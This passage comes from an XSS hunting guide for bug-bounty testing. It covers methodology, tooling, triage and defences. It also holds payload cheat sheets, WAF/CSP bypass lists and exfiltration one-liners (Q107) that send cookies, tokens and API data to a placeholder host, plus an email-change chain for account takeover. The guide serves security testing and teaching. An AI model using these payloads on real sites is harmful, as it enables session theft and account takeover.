### Q93. How do I escalate a "reflected XSS with heavy interaction" finding?
Reduce the interaction (find a 0-click sink / a GET-delivered payload), find a **stored** variant of the same sink,
chain it to **token theft → ATO**, or land it in an **admin** context. Reflected XSS that needs an unusual click is
Medium; reduce friction and raise impact.

### Q94. What evidence makes a great XSS report?
The exact URL/param/field + context, the **firing payload** (`alert(document.domain)` screenshot or an OOB hit for
blind), and the **impact chain** (stolen token/cookie → ATO; or admin-context execution; or CSRF-token theft → email
change → reset). State stored vs reflected vs DOM, the serving origin (for stored), and that it was demonstrated with
your own account.

### Q95. What's the impact-vs-trigger rule (most important)?
`alert(document.domain)` proves **execution**; the **finding** is what you *do* with it: ATO (cookie/token theft or
CSRF-token→email change), admin-context execution (privilege escalation), or mass stored XSS. Lead the title/report
with the **impact**, not "XSS popup".

### Q96. What separates expert XSS testing from beginner?
The expert (1) nails the **exact context** and uses the **minimal** correct breakout; (2) finds **DOM/mXSS/postMessage/
prototype-pollution** XSS scanners miss; (3) **bypasses** WAF/CSP/sanitizer methodically (script gadgets, mXSS, DOMPurify
CVEs, dangling-markup); (4) plants **blind** payloads to reach **admin** contexts; (5) **escalates to ATO** (HttpOnly-proof,
via token/CSRF-token theft) and chains to CORS/RCE; and (6) reports the **impact** with a clean PoC, own accounts, and
discipline.

---

# TOOLING

### Q97. Core XSS toolkit?
**Burp/Caido** (Repeater + **DOM Invader** for DOM/postMessage); **kxss/Gxss** + **Dalfox** (reflective-param discovery
+ verify); **interactsh / Burp Collaborator / XSS-Hunter** (blind XSS + exfil); **DevTools** (DOM vs source, sink
breakpoints); `csp-evaluator.withgoogle.com` (CSP analysis); **webcrack/js-beautify** (read bundles for DOM sinks);
the kit's `poc/` (cookie/token exfil, blind beacon, keylogger, ATO, internal scan).

### Q98. How do I use DOM Invader effectively?
Browse the app in Burp's built-in browser with DOM Invader on; it flags **source→sink** flows and **vulnerable
postMessage** handlers automatically and can generate a working PoC. It's the fastest path to DOM/postMessage XSS that
fuzzers miss.

### Q99. How do I build a reliable XSS oracle (automation)?
For reflected: detect the **firing** of a unique callback (an OOB beacon), not just reflection. For DOM: instrument the
sink (DOM Invader / a breakpoint). For blind: an XSS-Hunter hit keyed to the input. Gate findings on **execution**, not
on a reflected string (scanners over-report reflection).

### Q100. Continuous / at-scale XSS hunting?
Pipe `gau`/`waybackurls | kxss`/`Dalfox` over a scope, plant **blind** payloads (XSS-Hunter) broadly in stored fields,
and re-test on deploys. Diff JS bundles for new DOM sinks (JS-files kit). The blind-stored approach catches admin-panel
XSS you'd never see manually.

---

# METHODOLOGY & TRIAGE

### Q101. Step-by-step methodology.
1. **Recon** the injection surface (params + non-obvious sources + DOM sinks). 2. **Detect** reflection/sink, name the
**context**, confirm **execution**. 3. **Exploit the context** (or trace DOM source→sink). 4. **Bypass** WAF/CSP/
sanitizer/limits if blocked. 5. **Escalate to impact** (ATO via token/CSRF-token theft, admin-context, stored/blind).
6. **Report** the impact with a clean PoC, stored/reflected/DOM noted, own accounts.

### Q102. Quick triage decision tree.
- Stored XSS in an **admin/support** context → admin ATO (**Critical**).
- Stored XSS hitting **any** user → mass ATO (**High–Critical**).
- Reflected/DOM XSS → token/cookie theft → **ATO** (High); reduce interaction.
- **mXSS/DOMPurify** bypass → stored XSS (High).
- **postMessage** no-origin-check → cross-origin DOM XSS → ATO (High).
- **CSTI** (Angular/Vue) → XSS (High).
- Self-XSS / reflected needing heavy interaction → chain or downgrade (Medium/Low).

### Q103. False positives / auto-reject.
- A reflected marker that's **HTML-encoded** / inside a correctly-quoted attribute (no breakout) → not XSS.
- **Self-XSS** with no chain.
- `alert(1)` in a **sandbox/usercontent** domain with no access to the app origin/session → low/none.
- A **report-only** CSP cited as a mitigation (it doesn't block).
- "Dalfox flagged it" with no manual firing-execution confirmation.
- XSS on a **third-party**/out-of-scope asset.

### Q104. What makes a great XSS report (severity)?
Title = the **impact** ("Stored XSS in support-ticket subject → admin account takeover"). Include the context, the
firing PoC (or OOB hit), the **impact chain** (token/CSRF-token theft → ATO; or admin-context), CWE-79 (+ CWE-352 if
you chain CSRF, CWE-384 session), the serving origin (stored), and own-account discipline. One root cause = one finding.

---

# CHEAT SHEETS

### Q105. Context → payload cheat sheet.
```
HTML body:     <svg onload=alert(document.domain)>   <img src=x onerror=alert(document.domain)>
quoted attr:   "><svg onload=alert(1)>   " autofocus onfocus=alert(1) x="
unquoted attr: x onmouseover=alert(1)    /onmouseover=alert(1)
event-handler: ');alert(1)//   '-alert(1)-'   &#39;);alert(1)//
JS string:     ";alert(1)//   '-alert(1)-'   `${alert(1)}`   </script><svg onload=alert(1)>
URL/href:      javascript:alert(document.domain)   data:text/html,<script>alert(1)</script>
CSS:           red"></style><svg onload=alert(1)>   (+ CSS attribute-exfil for no-JS)
comment:       --><svg onload=alert(1)>
template/CSTI: {{constructor.constructor('alert(document.domain)')()}}   (AngularJS)
```

### Q106. WAF/CSP-bypass cheat sheet.
```
WAF: <sCrIpT> · <svg/onload=…> · &#x61;lert · top['ale'+'rt'](1) · alert`1` · eval(atob('…')) · #fragment (skips WAF)
CSP: unsafe-inline → inline runs · JSONP on allowed host (callback=alert) · script gadget (ng-csp/data-require/Vue)
     missing base-uri → <base href=//you/> · reused/reflected nonce → reuse it · report-only → does NOT block
     no JS at all → dangling-markup exfil + CSS exfil (steal CSRF token/secret)
sanitizer/DOMPurify: match the version (cure53 advisories) → SVG/MathML namespace mXSS · loose ALLOWED_URI_REGEXP · bad ADD_ATTR
```

### Q107. Impact one-liners cheat sheet (own account; redact).
```js
// cookie theft (no HttpOnly)
new Image().src='//YOU/c?'+encodeURIComponent(document.cookie);
// localStorage/token theft
new Image().src='//YOU/k?'+encodeURIComponent(localStorage.token);
// HttpOnly-proof ATO via CSRF-token theft → email change → reset
fetch('/account',{credentials:'include'}).then(r=>r.text()).then(h=>fetch('/account/email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'csrf='+h.match(/csrf"\svalue="([^"]+)/)[1]+'&email=attacker@evil.tld'}));
// blind beacon (where did it fire?)
new Image().src='//YOU/b?u='+encodeURIComponent(location.href)+'&d='+document.domain;
// cross-origin secret read (if CORS misconfig) → CORS kit
fetch('https://api.t/me',{credentials:'include'}).then(r=>r.text()).then(d=>navigator.sendBeacon('//YOU/me',d));
```

### Q108. DOM XSS quick-test cheat sheet.
```
https://t/page#<img src=x onerror=alert(document.domain)>       https://t/page#<svg onload=alert(document.domain)>
https://t/page?returnUrl=javascript:alert(document.domain)       https://t/#/redirect?url=javascript:alert(1)
prototype pollution: ?__proto__[innerHTML]=<img src=x onerror=alert(document.domain)>  (confirm: ({}).x)
postMessage: victimFrame.postMessage('<img src=x onerror=alert(document.domain)>','*')  (no origin check)
```

---

### The probe-result decision flow — "if I injected THIS and got back THAT, do THIS"
> Inject **`xss7f3a9'"<>`**, find your marker in the **raw response AND the live DOM**, read the surrounding bytes, and branch.
```
WHERE did xss7f3a9 land?
  raw HTML, between tags, < > RAW ............ HTML BODY    → <svg onload=alert(document.domain)>          (Q25)
  value="xss7f3a9", " came back RAW .......... QUOTED ATTR  → "><svg onload=alert(1)>                       (Q26)
  value="xss7f3a9", " is &quot; but > is raw . ATTR, no quote→ " autofocus onfocus=alert(1) x="            (Q26)
  value=xss7f3a9 (no quotes) ................. UNQUOTED ATTR→ x onmouseover=alert(1)                        (Q27)
  on…="…xss7f3a9…" .......................... JS-IN-ATTR   → ');alert(1)//   (entities decode here)        (Q28)
  <script> … "xss7f3a9" … </script> ......... JS STRING    → ";alert(1)//    or </script><svg onload=…>    (Q29)
  href="xss7f3a9" ........................... URL          → javascript:alert(document.domain)            (Q32)
  only in the live DOM (not raw HTML) ....... DOM-BASED    → #<img src=x onerror=alert(document.domain)>   (Q45)
  EVERYTHING encoded (&lt; &quot; …) ........ pivot → JS(Q29)/URL(Q32)/DOM #frag(Q45)/CSTI(Q42) — don't fight HTML
BLOCKED? WAF 403/stripped → Q61-62 · CSP → Q63-70 · sanitizer/DOMPurify → Q49-51 · length-limited → Q73
IT FIRED? → escalate to IMPACT: cookie/token theft → ATO (Q79-82) · HttpOnly-proof via CSRF-token theft (Q81) · admin context (Q83)
```
> Read what came back → you know the exact breakout AND the escalation. That diagnostic loop *is* expertise (Q96).

---

# REAL-WORLD ATTACKS & REFERENCES

### Q109. Recurring real-world XSS attacks / classes.
- **Stored XSS in admin/support tools** (ticket subjects, user-agent logs, profile fields) → admin ATO (countless H1 reports).
- **DOMPurify/sanitizer bypasses** (cure53) → stored XSS on rich-text/comment features → ATO.
- **AngularJS sandbox-escape CSTI** `{{constructor.constructor('…')()}}` (works with `<>` encoded).
- **React `dangerouslySetInnerHTML` / `href={userInput}`** and **Vue `v-html`** → XSS.
- **postMessage** handlers with no origin check → cross-origin DOM XSS → ATO (very common, scanner-invisible).
- **Prototype-pollution gadget chains** (lodash/jQuery/$.extend) → DOM XSS (client) / RCE (server-Node).
- **SVG uploaded & served inline** from the app origin → stored XSS (FileUpload kit).
- **Cache-poisoned / Host-header-reflected XSS** served to all users (Host-Header kit) → mass stored XSS.
- **The Samy worm** (MySpace, 2005) — the canonical self-propagating stored-XSS worm (mass impact illustration).

### Q110. Resources to work through.
PortSwigger Web Security Academy → **Cross-site scripting** (all labs: reflected/stored/DOM, contexts, **CSP bypass**,
**DOM XSS**, **prototype pollution**) + the **XSS cheat sheet** + research (mXSS, "Bypassing CSP", hidden-input XSS);
OWASP **XSS Filter Evasion** + **XSS Prevention** cheat sheets; HackTricks *XSS*; PayloadsAllTheThings *XSS Injection*;
**cure53 DOMPurify** advisories; Google **"CSP Is Dead, Long Live CSP"** (script gadgets); Hackviser & PentesterLab XSS
modules. Read 20+ disclosed reports tagged "stored XSS / DOM XSS / XSS to ATO".

---

# DEFENSE — PREVENTING XSS

### Q111. What's the gold-standard XSS defense?
**Context-aware output encoding** by default (the framework auto-escapes HTML/attribute/JS/URL/CSS for the **right**
context), `textContent`/safe templating instead of `innerHTML`, and a **trusted HTML sanitizer** (well-maintained
DOMPurify, kept patched) for any user-supplied HTML. Validate input, but **encoding on output** is the real fix.

### Q112. How do CSP and Trusted Types help?
A strict **CSP** (`default-src 'self'`, nonce/hash-based scripts, no `'unsafe-inline'`/`'unsafe-eval'`, `object-src
'none'`, `base-uri 'none'`) is **defense-in-depth** that limits XSS impact. **Trusted Types**
(`require-trusted-types-for 'script'`) makes dangerous DOM sinks (`innerHTML`/`eval`) **throw** unless passed a
policy-vetted value — killing most DOM XSS at the sink. Neither replaces correct encoding, but both blunt exploitation.

### Q113. Per-vector hardening?
- **Reflected/stored:** context-aware encoding; sanitize HTML; never reflect into JS/`href` unescaped.
- **DOM:** avoid `innerHTML`/`document.write`/`eval`; use Trusted Types; validate `event.origin` on `message` handlers; don't `postMessage` secrets with `'*'`.
- **mXSS/sanitizer:** keep DOMPurify current; avoid re-serialize/re-parse round-trips of sanitized HTML.
- **Prototype pollution:** freeze prototypes / use `Map`/null-proto objects; avoid recursive merge of user input.
- **Cookies/tokens:** **HttpOnly + Secure + SameSite** session cookies; don't store tokens in localStorage.
- **Uploads:** serve user files from a **sandbox domain** with `attachment` + `nosniff` (FileUpload kit).

### Q114. One-paragraph summary you can quote.
*"XSS is fixed by encoding output for its exact context and treating all user data as untrusted: auto-escape for
HTML/attribute/JS/URL/CSS, use `textContent` and a maintained sanitizer (DOMPurify) instead of `innerHTML`, avoid the
dangerous DOM sinks (or gate them with Trusted Types), and validate `event.origin` on every postMessage handler. Layer
a strict, nonce-based CSP with `object-src`/`base-uri 'none'` as defense-in-depth, store session tokens in HttpOnly+
SameSite cookies (never localStorage), serve user uploads from a sandbox domain, and freeze prototypes to kill
pollution gadgets. A single unencoded reflection or one `innerHTML` of attacker data can otherwise run script in your
origin and take over any user's account — including an administrator — so encoding correctness, not blacklisting, is
the control that matters."*

---

## APPENDIX — 60-second XSS field checklist
```
[ ] Map sources: params + headers (Referer/UA) + cookies + #fragment(DOM) + window.name + postMessage + stored fields + uploads(SVG/HTML)
[ ] Detect: unique marker → which chars survive → NAME the context → confirm EXECUTION (alert(document.domain) / OOB beacon)
[ ] Exploit the CONTEXT (body/attr/JS/URL/CSS/comment/template) with the MINIMAL breakout ; or trace DOM source→sink (DOM Invader)
[ ] mXSS/DOMPurify (match version, cure53) ; prototype pollution (__proto__[innerHTML]) ; postMessage (no origin check)
[ ] Bypass: WAF (case/encode/split/#fragment) · CSP (JSONP/script-gadget/<base>/nonce-reuse/dangling-markup) · sanitizer (allowed-tag/scheme)
[ ] Plant BLIND payloads (XSS-Hunter) in stored fields → reach ADMIN/support context
[ ] ESCALATE TO IMPACT: cookie/token theft → ATO ; HttpOnly-proof via CSRF-token theft → email change → reset ; admin-context → priv-esc
[ ] CHAIN: + CORS (cross-origin read) · + prototype-pollution→RCE(server) · stored XSS → mass ATO
[ ] Report the IMPACT (not alert(1)) ; CWE-79 (+352/384) ; own accounts ; PoC page down ; stored/reflected/DOM noted
```
*End of guide.*
